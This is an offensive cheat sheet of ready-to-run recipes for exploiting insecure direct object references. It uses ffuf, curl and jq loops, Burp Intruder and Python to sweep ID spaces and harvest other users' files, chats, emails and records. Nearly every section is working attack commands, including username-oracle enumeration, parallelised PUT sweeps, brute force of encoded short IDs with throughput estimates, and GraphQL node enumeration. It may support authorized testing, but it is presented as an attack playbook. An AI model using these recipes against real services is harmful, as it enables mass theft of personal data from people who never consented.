# IDOR ID enumeration recipes (ffuf / jq / Burp Intruder / Python) — Open WHEN: you have a confirmed object-reference parameter and a valid session, and need to sweep the ID space to harvest other principals' records

## ffuf — single numeric ID, filter the 404 template
`-fr` drops the not-found body so only true hits survive; keep your cookie attached.
```bash
ffuf -u 'http://TARGET/download.php?id=FUZZ' \
  -H 'Cookie: PHPSESSID=<session>' \
  -w <(seq 0 6000) \
  -fr 'File Not Found' -o hits.json -of json
jq -r '.results[].url' hits.json
```
Auto-calibrate instead of a hand-picked string when the 404 body varies: add `-ac` (or `-acc` for per-FUZZ calibration). Other filters: `-fs <size>` (size), `-fc 404,403` (code), `-ft >200` (response time ms).

## ffuf — combinatorial dual-ID sweep (e.g. chat thread between two users)
Clusterbomb both positions, then drop symmetric `(A,B)==(B,A)` duplicates with jq.
```bash
ffuf -u 'http://TARGET/chat.php?chat_users[0]=NUM1&chat_users[1]=NUM2' \
  -w <(seq 1 62):NUM1 -w <(seq 1 62):NUM2 \
  -H 'Cookie: PHPSESSID=<session>' \
  -ac -mode clusterbomb -o chats.json -of json
jq -r '.results[] | select((.input.NUM1|tonumber) < (.input.NUM2|tonumber)) | .url' chats.json
```

## ffuf — error-message oracle to enumerate valid users, then pull their files
Hold a benign filename, fuzz the username, filter on the "not found" string so only real users pass.
```bash
ffuf -u 'http://TARGET/view.php?username=FUZZ&file=test.doc' \
  -b 'PHPSESSID=<session>' \
  -w /opt/SecLists/Usernames/Names/names.txt \
  -fr 'User not found'
# then fetch each valid user's docs directly:
curl -s -b 'PHPSESSID=<session>' 'http://TARGET/view.php?username=amanda&file=privacy.odt' -o amanda.odt
```

## curl loop + jq — descending sweep of a JSON-body PUT, grep a field that only exists on a hit
```bash
for id in $(seq 64185742 -1 64185700); do
  curl -s -X PUT 'https://TARGET/api/lead/cem-xhr' \
    -H 'Content-Type: application/json' -H "Cookie: auth=$TOKEN" \
    -d '{"lead_id":'"$id"'}' | jq -e '.email' >/dev/null && echo "hit $id"
done
```
Parallelise with `xargs -P`:
```bash
seq 1 64185742 | xargs -P 20 -I{} sh -c \
  'curl -s -X PUT https://TARGET/api/lead/cem-xhr -H "Content-Type: application/json" \
   -H "Cookie: auth='"$TOKEN"'" -d "{\"lead_id\":{}}" | jq -e ".email" >/dev/null && echo hit {}'
```

## Burp Intruder — short structured IDs with on-the-fly encoding
For IDs like `C-285-100` that the backend expects ASCII-hex / Base64 encoded (encoding adds no entropy — short IDs are bearer tokens):
1. Mark positions on the letter + each digit group; pick **Pitchfork** (lock-step) or **Cluster bomb** (cartesian).
2. Payload sets: `[A-Z]` for the letter, `000-999` brute ranges for the digit groups.
3. Payload processing → Add rule → Encode → **ASCII hex** (or Base64) so each request ships the encoded blob the backend wants.
4. Settings → Grep - Match: add a token present only in valid responses (a media URL / JSON field); invalid IDs return `[]` or 404. Sort the results table by that column.

## Python — client-side encode + grep, when Intruder is unavailable
```python
import requests
to_hex = lambda s: ''.join(f"{ord(c):02x}" for c in s)
for band in ("C-285-100", "T-544-492"):
    r = requests.get("https://TARGET/memories/api", params={"id": to_hex(band)})
    if r.ok and "media" in r.text:
        print(band, "->", r.json())
```
Throughput note: a single laptop loop sustains ~100-140 req/s; a ~26M short-ID keyspace falls in ~50 h, ~1M in ~2 h. Re-run the identical config after any "we added throttling" claim — unchanged hit-rate proves the control is absent.

## Relay/GraphQL global-node sweep (encode-decode the rawId)
```bash
for i in $(seq 450 470); do
  gid=$(printf 'User:%d' "$i" | base64)
  curl -s https://TARGET/graphql -H 'Content-Type: application/json' -H "Cookie: $C" \
    -d '{"query":"{ node(id:\"'"$gid"'\"){ ... on User { email }}}"}' | jq -c '.data.node'
done
```
